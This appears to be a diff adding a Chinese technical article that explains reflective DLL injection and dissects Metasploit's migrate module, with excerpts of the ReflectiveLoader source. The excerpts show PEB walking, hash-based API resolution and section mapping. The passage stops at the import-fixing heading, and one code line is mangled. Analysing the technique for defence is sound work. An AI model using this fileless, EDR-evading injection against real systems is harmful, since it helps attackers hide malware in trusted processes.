@@ -1,0 +1,143 @@
+# 一、 **前言**
+dll注入技术是让某个进程主动加载指定的dll的技术。恶意软件为了提高隐蔽性，通常会使用dll注入技术将自身的恶意代码以dll的形式注入高可信进程。
+常规的dll注入技术使用LoadLibraryA()函数来使被注入进程加载指定的dll。常规dll注入的方式一个致命的缺陷是需要恶意的dll以文件的形式存储在受害者主机上。这样使得常规dll注入技术在受害者主机上留下痕迹较大，很容易被edr等安全产品检测到。为了弥补这个缺陷，stephen
+fewer提出了反射式dll注入技术并在[github开源](https://github.com/stephenfewer/ReflectiveDLLInjection)，反射式dll注入技术的优势在于可以使得恶意的dll通过socket等方式直接传输到目标进程内存并加载，期间无任何文件落地，安全产品的检测难度大大增加。
+本文将从dll注入技术简介、msf migrate模块剖析、检测思路和攻防对抗的思考等方向展开说明反射式dll注入技术。
+# 二、 **dll注入技术简介**
+## **2.1 常规dll注入技术**
+常规dll注入有:
+  1. 通过调用CreateRemoteThread()/NtCreateThread()/RtlCreateUserThread()函数在被注入进程创建线程进行dll注入。
+  2. 通过调用QueueUserAPC()/SetThreadContext()函数来劫持被注入进程已存在的线程加载dll。
+  3. 通过调用SetWindowsHookEx()函数来设置拦截事件，在发生对应的事件时，被注入进程执行拦截事件函数加载dll。
+以使用CreateRemoteThread()函数进行dll注入的方式为例，实现思路如下:
+  1. 获取被注入进程PID。
+  2. 在注入进程的访问令牌中开启SE_DEBUG_NAME权限。
+  3. 使用openOpenProcess()函数获取被注入进程句柄。
+  4. 使用VirtualAllocEx()函数在被注入进程内开辟缓冲区并使用WriteProcessMemory()函数写入DLL路径的字符串。
+  5. 使用GetProcAddress()函数在当前进程加载的kernel32.dll找到LoadLibraryA函数的地址。
+  6. 通过CreateRemoteThread()函数来调用LoadLibraryA()函数，在被注入进程新启动一个线程，使得被注入进程进程加载恶意的DLL。
+常规dll注入示意图如上图所示。该图直接从步骤3)开始，步骤1)和步骤2)不在赘述。
+## **2.2 反射式dll注入技术**
+反射式dll注入与常规dll注入类似，而不同的地方在于反射式dll注入技术自己实现了一个reflective
+loader()函数来代替LoadLibaryA()函数去加载dll，示意图如下图所示。蓝色的线表示与用常规dll注入相同的步骤，红框中的是reflective
+loader()函数行为，也是下面重点描述的地方。
+Reflective loader实现思路如下：
+  1. 获得被注入进程未解析的dll的基地址，即下图第7步所指的dll。
+  2. 获得必要的dll句柄和函数为修复导入表做准备。
+  3. 分配一块新内存去取解析dll，并把pe头复制到新内存中和将各节复制到新内存中。
+  4. 修复导入表和重定向表。
+  5. 执行DllMain()函数。
+# 三、 **Msf migrate模块剖析**
+msf的migrate模块是post阶段的一个模块，其作用是将meterpreter payload从当前进程迁移到指定进程。
+在获得meterpreter session后可以直接使用migrate命令迁移进程，其效果如下图所示:
+migrate的模块的实现和stephen
+fewer的[ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection)项目大致相同，增加了一些细节，其实现原理如下:
+  1. 读取metsrv.dll（metpreter payload模板dll）文件到内存中。
+  2. 生成最终的payload。
+a) msf生成一小段汇编migrate stub主要用于建立socket连接。
+b) 将metsrv.dll的dos头修改为一小段汇编meterpreter_loader主要用于调用reflective
+loader函数和dllmain函数。在metsrv.dll的config block区填充meterpreter建立session时的配置信息。
+c) 最后将migrate stub和修改后的metsrv.dll拼接在一起生成最终的payload。
+  3. 向msf server发送migrate请求和payload。
+  4. msf向迁移目标进程分配一块内存并写入payload。
+  5. msf首先会创建的远程线程执行migrate stub，如果失败了，就会尝试用apc注入的方式执行migrate stub。migrate stub会调用meterpreter loader，meterpreter loader才会调用reflective loader。
+  6. reflective loader进行反射式dll注入。
+  7. 最后msf client和msf server建立一个新的session。
+原理图如下所示:
+图中红色的线表示与常规反射式dll注入不同的地方。红色的填充表示修改内容，绿色的填充表示增加内容。migrate模块的reflective
+loader是直接复用了stephen
+fewer的ReflectiveDLLInjection项目的[ReflectiveLoader.c](https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveLoader.c)中的ReflectiveLoader()函数。下面我们主要关注reflective
+loader的行为。
+## **3.1 静态分析**
+### **3.1.1 获取dll基地址**
+ReflectiveLoader()首先会调用caller()函数
+    uiLibraryAddress = caller();
+caller()函数实质上是_ReturnAddress()函数的封装。caller()函数的作用是获取caller()函数的返回值，在这里也就是ReflectiveLoader()函数中调用caller()函数的下一条指令的地址。
+    #ifdef __MINGW32__
+    #define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
+    #else
+    #pragma intrinsic(_ReturnAddress)
+    #define WIN_GET_CALLER() _ReturnAddress()
+    #endif
+    __declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }
+然后，向低地址逐字节比较是否为为dos头的标识MZ字串，若当前地址的内容为MZ字串，则把当前地址认为是dos头结构体的开头，并校验dos头e_lfanew结构成员是否指向pe头的标识”PE”字串。若校验通过，则认为当前地址是正确的dos头结构体的开头。
+    while( TRUE )
+    {
+        //将当前地址当成dos头结构，此结构的e_magic成员变量是否指向MZ子串
+        if( ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE ) 
+        {
+            uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
+            if( uiHeaderValue >= sizeof(IMAGE_DOS_HEADER) && uiHeaderValue Signature == IMAGE_NT_SIGNATURE )
+                    break;
+            }
+        }
+        uiLibraryAddress--;
+    }
+### **3.1.2 获取必要的dll句柄和函数地址**
+获取必要的dll句柄是通过遍历peb结构体中的ldr成员中的InMemoryOrderModuleList链表获取dll名称，之后算出dll名称的hash，最后进行hash对比得到最终的hash。
+    uiBaseAddress = (ULONG_PTR)((_PPEB)uiBaseAddress)->pLdr;
+    uiValueA = (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)->InMemoryOrderModuleList.Flink;
+    while( uiValueA )
+    {
+        uiValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.pBuffer;
+        usCounter = ((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.Length;
+        uiValueC = 0;
+        ULONG_PTR tmpValC = uiValueC;
+        //计算tmpValC所指向子串的hash值，并存储在uiValueC中
+        ....
+        if( (DWORD)uiValueC == KERNEL32DLL_HASH )
+必要的函数是遍历函数所在的dll导出表获得函数名称，然后做hash对比得到的。
+    uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;
+    uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;
+    uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];
+    uiExportDir = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );
+    uiNameArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames );
+    uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );
+    usCounter = 3;
+    while( usCounter > 0 )
+            {
+            dwHashValue = _hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );
+                if( dwHashValue == LOADLIBRARYA_HASH
+                //等于其他函数hash的情况
+                || ...
+                )
+                {
+                    uiAddressArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );
+                    uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );
+                    if( dwHashValue == LOADLIBRARYA_HASH )
+                        pLoadLibraryA = (LOADLIBRARYA)( uiBaseAddress + DEREF_32( uiAddressArray ) );
+                    //等于其他函数hash的情况
+                    ...
+                    usCounter--;
+                }
+                uiNameArray += sizeof(DWORD);
+                uiNameOrdinals += sizeof(WORD);
+            }
+    }
+### **3.1.3 将dll映射到新内存**
+Nt optional
+header结构体中的SizeOfImage变量存储着pe文件在内存中解析后所占的内存大小。所以ReflectiveLoader()获取到SizeOfImage的大小，分配一块新内存,然后按照section
+headers结构中的文件相对偏移和相对虚拟地址，将pe节一一映射到新内存中。
+    //分配SizeOfImage的新内存
+    uiBaseAddress = (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+    ...
+    uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
+    uiValueB = uiLibraryAddress;
+    uiValueC = uiBaseAddress;
+    //将所有头和节表逐字节复制到新内存
+    while( uiValueA-- )
+        *(BYTE *)uiValueC++ = *(BYTE *)uiValueB++;
+    //解析每一个节表项
+    uiValueA = ( (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader );
+    uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
+    while( uiValueE-- )
+    {
+        uiValueB = ( uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress );
+        uiValueC = ( uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData );
+        uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;
+        //将每一节的内容复制到新内存对应的位置
+        while( uiValueD-- )
+            *(BYTE *)uiValueB++ = *(BYTE *)uiValueC++;
+        uiValueA += sizeof( IMAGE_SECTION_HEADER );
+    }
+### **3.1.4 修复导入表和重定位表**
